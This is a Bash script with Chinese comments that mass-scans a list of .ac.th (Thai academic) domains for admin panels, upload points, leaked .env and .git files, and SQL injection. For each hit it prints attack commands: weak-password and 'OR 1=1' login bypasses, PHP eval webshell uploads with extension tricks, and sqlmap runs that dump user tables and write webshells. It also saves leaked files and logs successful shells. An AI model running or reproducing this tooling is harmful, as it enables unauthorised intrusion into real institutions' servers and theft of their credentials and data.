#!/bin/bash
# 一个一个手动打点脚本
# 每个目标详细测试，等待手动操作

TARGET_FILE="/workspace/ac_th_full_targets.txt"
PROGRESS_FILE="/workspace/manual_progress.txt"
SUCCESS_FILE="/workspace/manual_success.txt"
SHELLS_DIR="/workspace/manual_shells"

mkdir -p "$SHELLS_DIR"

# 初始化进度
[[ ! -f "$PROGRESS_FILE" ]] && echo "0" > "$PROGRESS_FILE"

CURRENT=$(cat "$PROGRESS_FILE")
TOTAL=$(wc -l < "$TARGET_FILE")

echo "========================================"
echo "   .ac.th 一个一个手动打点"
echo "========================================"
echo "总目标: $TOTAL 个"
echo "已完成: $CURRENT 个"
echo "剩余: $((TOTAL - CURRENT)) 个"
echo "========================================"
echo ""

# 从当前进度继续
tail -n +$((CURRENT + 1)) "$TARGET_FILE" | while IFS= read -r TARGET; do
    [[ -z "$TARGET" ]] && continue
    
    CURRENT=$((CURRENT + 1))
    echo "$CURRENT" > "$PROGRESS_FILE"
    
    clear
    echo "========================================"
    echo "  目标 $CURRENT / $TOTAL"
    echo "========================================"
    echo ""
    echo "目标: $TARGET"
    echo ""
    echo "========================================"
    
    # 阶段1: 存活检测
    echo ""
    echo "[阶段1] 存活检测..."
    echo ""
    
    HTTP_CODE=$(curl -I "http://$TARGET" -m 10 -s -o /dev/null -w "%{http_code}" 2>/dev/null)
    HTTPS_CODE=$(curl -I "https://$TARGET" -m 10 -s -o /dev/null -w "%{http_code}" 2>/dev/null)
    
    if [[ "$HTTP_CODE" == "000" ]] && [[ "$HTTPS_CODE" == "000" ]]; then
        echo "✗ 目标无响应（HTTP: $HTTP_CODE, HTTPS: $HTTPS_CODE）"
        echo ""
        echo "按回车继续下一个..."
        read
        continue
    fi
    
    if [[ "$HTTP_CODE" != "000" ]]; then
        URL="http://$TARGET"
        echo "✓ HTTP 可访问: $HTTP_CODE"
    else
        URL="https://$TARGET"
        echo "✓ HTTPS 可访问: $HTTPS_CODE"
    fi
    
    # 获取标题和Server
    TITLE=$(curl -s "$URL" -m 5 2>/dev/null | grep -oP '(?<=<title>).*(?=</title>)' | head -1)
    SERVER=$(curl -I "$URL" -m 5 -s 2>/dev/null | grep -i "^Server:" | cut -d: -f2- | xargs)
    
    echo "标题: ${TITLE:-未知}"
    echo "服务器: ${SERVER:-未知}"
    echo ""
    
    # 阶段2: 后台探测
    echo "[阶段2] 后台探测..."
    echo ""
    
    ADMIN_FOUND=""
    for ADMIN_PATH in /admin /administrator /manage /backend /console /wp-admin /phpmyadmin /admin.php /login /login.php; do
        CODE=$(curl -I "$URL$ADMIN_PATH" -m 5 -s -o /dev/null -w "%{http_code}" 2>/dev/null)
        if [[ "$CODE" =~ ^(200|401|403|302)$ ]]; then
            echo "  ✓ $ADMIN_PATH → $CODE"
            ADMIN_FOUND="$URL$ADMIN_PATH"
        fi
    done
    
    [[ -z "$ADMIN_FOUND" ]] && echo "  ✗ 未发现后台"
    echo ""
    
    # 阶段3: 上传点探测
    echo "[阶段3] 上传点探测..."
    echo ""
    
    UPLOAD_FOUND=""
    for UPLOAD_PATH in /upload.php /upload /uploads /uploader.php /file_upload.php /ajax_upload.php; do
        CODE=$(curl -I "$URL$UPLOAD_PATH" -m 5 -s -o /dev/null -w "%{http_code}" 2>/dev/null)
        if [[ "$CODE" == "200" ]]; then
            echo "  ✓ $UPLOAD_PATH → 200"
            UPLOAD_FOUND="$URL$UPLOAD_PATH"
        fi
    done
    
    [[ -z "$UPLOAD_FOUND" ]] && echo "  ✗ 未发现上传点"
    echo ""
    
    # 阶段4: 敏感文件
    echo "[阶段4] 敏感文件探测..."
    echo ""
    
    LEAK_FOUND=""
    for LEAK_PATH in /.git/config /.env /config.php /phpinfo.php /info.php /test.php; do
        RESP=$(curl "$URL$LEAK_PATH" -m 5 -s 2>/dev/null)
        if [[ $(echo "$RESP" | wc -c) -gt 100 ]]; then
            echo "  ✓ $LEAK_PATH → 泄露"
            LEAK_FOUND="yes"
            echo "$RESP" > "$SHELLS_DIR/${TARGET}_$(basename $LEAK_PATH)"
        fi
    done
    
    [[ -z "$LEAK_FOUND" ]] && echo "  ✗ 未发现敏感文件"
    echo ""
    
    # 阶段5: SQL注入快速测试
    echo "[阶段5] SQL注入快速测试..."
    echo ""
    
    SQLI_FOUND=""
    for PARAM in id page user article news cat; do
        RESP=$(curl "$URL/?$PARAM=1'" -m 5 -s 2>&1)
        if echo "$RESP" | grep -qi "sql\|mysql\|syntax\|error.*query"; then
            echo "  ✓ ?$PARAM= 可能存在SQL注入"
            SQLI_FOUND="$URL/?$PARAM="
            break
        fi
    done
    
    [[ -z "$SQLI_FOUND" ]] && echo "  ✗ 未发现明显SQL注入"
    echo ""
    
    # 显示总结
    echo "========================================"
    echo "           扫描总结"
    echo "========================================"
    echo ""
    
    if [[ -n "$ADMIN_FOUND" ]] || [[ -n "$UPLOAD_FOUND" ]] || [[ -n "$SQLI_FOUND" ]] || [[ -n "$LEAK_FOUND" ]]; then
        echo "✓ 发现可利用点！"
        echo ""
        echo "$TARGET" >> "$SUCCESS_FILE"
        
        # 显示手动测试命令
        echo "========================================"
        echo "       手动打点命令"
        echo "========================================"
        echo ""
        
        if [[ -n "$ADMIN_FOUND" ]]; then
            echo "【管理后台弱口令测试】"
            echo ""
            echo "# 测试 admin/admin"
            echo "curl -X POST '$ADMIN_FOUND/login.php' -d 'username=admin&password=admin' -c /tmp/cookie_${CURRENT}.txt -v"
            echo ""
            echo "# 测试 admin/password"
            echo "curl -X POST '$ADMIN_FOUND/login.php' -d 'username=admin&password=password' -c /tmp/cookie_${CURRENT}.txt -v"
            echo ""
            echo "# 测试 admin/123456"
            echo "curl -X POST '$ADMIN_FOUND/login.php' -d 'username=admin&password=123456' -c /tmp/cookie_${CURRENT}.txt -v"
            echo ""
            echo "# SQL注入绕过登录"
            echo "curl -X POST '$ADMIN_FOUND/login.php' -d \"username=admin' OR '1'='1&password=x\" -c /tmp/cookie_${CURRENT}.txt -v"
            echo ""
            echo "# 检查登录成功"
            echo "curl '$ADMIN_FOUND/dashboard.php' -b /tmp/cookie_${CURRENT}.txt"
            echo ""
            echo "---"
            echo ""
        fi
        
        if [[ -n "$UPLOAD_FOUND" ]]; then
            echo "【文件上传测试】"
            echo ""
            echo "# 创建Webshell"
            echo "echo '<?php eval(\$_POST[x]);?>' > /tmp/shell_${CURRENT}.php"
            echo ""
            echo "# 直接上传"
            echo "curl -X POST '$UPLOAD_FOUND' -F 'file=@/tmp/shell_${CURRENT}.php' -v"
            echo ""
            echo "# 如果被拦截，尝试绕过："
            echo ""
            echo "# 方法1: 双扩展名"
            echo "mv /tmp/shell_${CURRENT}.php /tmp/shell_${CURRENT}.php.jpg"
            echo "curl -X POST '$UPLOAD_FOUND' -F 'file=@/tmp/shell_${CURRENT}.php.jpg' -v"
            echo ""
            echo "# 方法2: 大小写"
            echo "mv /tmp/shell_${CURRENT}.php /tmp/shell_${CURRENT}.PhP"
            echo "curl -X POST '$UPLOAD_FOUND' -F 'file=@/tmp/shell_${CURRENT}.PhP' -v"
            echo ""
            echo "# 尝试访问Shell（常见路径）"
            echo "curl -X POST '$URL/uploads/shell_${CURRENT}.php' -d 'x=system(\"id\");'"
            echo "curl -X POST '$URL/files/shell_${CURRENT}.php' -d 'x=system(\"id\");'"
            echo "curl -X POST '$URL/upload/shell_${CURRENT}.php' -d 'x=system(\"id\");'"
            echo ""
            echo "---"
            echo ""
        fi
        
        if [[ -n "$SQLI_FOUND" ]]; then
            echo "【SQL注入利用】"
            echo ""
            echo "# SQLMap自动化"
            echo "sqlmap -u '$SQLI_FOUND' --batch --dbs"
            echo ""
            echo "# 获取当前数据库"
            echo "sqlmap -u '$SQLI_FOUND' --batch --current-db"
            echo ""
            echo "# 获取表"
            echo "sqlmap -u '$SQLI_FOUND' --batch -D 数据库名 --tables"
            echo ""
            echo "# 导出管理员账号"
            echo "sqlmap -u '$SQLI_FOUND' --batch -D 数据库名 -T users --dump"
            echo ""
            echo "# 写入Webshell"
            echo "echo '<?php eval(\$_POST[x]);?>' > /tmp/s_${CURRENT}.php"
            echo "sqlmap -u '$SQLI_FOUND' --batch --file-write=/tmp/s_${CURRENT}.php --file-dest=/var/www/html/s${CURRENT}.php"
            echo ""
            echo "# 访问Shell"
            echo "curl -X POST '$URL/s${CURRENT}.php' -d 'x=system(\"id\");'"
            echo ""
            echo "---"
            echo ""
        fi
        
        echo "========================================"
        echo ""
        echo "现在你可以："
        echo "  1. 复制上面的命令手动测试"
        echo "  2. 在另一个终端执行命令"
        echo "  3. 测试完成后按回车继续"
        echo ""
        echo "如果成功Getshell，请记录："
        echo "  echo '$URL|shell路径' >> $SUCCESS_FILE"
        echo ""
        echo "按回车继续下一个目标..."
        read
        
    else
        echo "✗ 未发现明显漏洞"
        echo ""
        echo "按回车继续下一个（或输入's'跳过10个）..."
        read -n 1 SKIP
        if [[ "$SKIP" == "s" ]]; then
            for i in {1..9}; do
                CURRENT=$((CURRENT + 1))
                echo "$CURRENT" > "$PROGRESS_FILE"
            done
            echo ""
            echo "已跳过10个目标"
            sleep 1
        fi
    fi
    
    # 每50个目标显示统计
    if [[ $((CURRENT % 50)) -eq 0 ]]; then
        clear
        echo "========================================"
        echo "         阶段性统计"
        echo "========================================"
        echo ""
        echo "已测试: $CURRENT / $TOTAL"
        echo "进度: $((CURRENT * 100 / TOTAL))%"
        echo "发现可利用: $(wc -l < $SUCCESS_FILE 2>/dev/null || echo 0)"
        echo ""
        echo "========================================"
        echo ""
        echo "按回车继续..."
        read
    fi
done

clear
echo "========================================"
echo "          测试完成！"
echo "========================================"
echo ""
echo "总测试: $TOTAL"
echo "发现可利用: $(wc -l < $SUCCESS_FILE 2>/dev/null || echo 0)"
echo ""
echo "可利用目标列表: $SUCCESS_FILE"
echo "========================================"
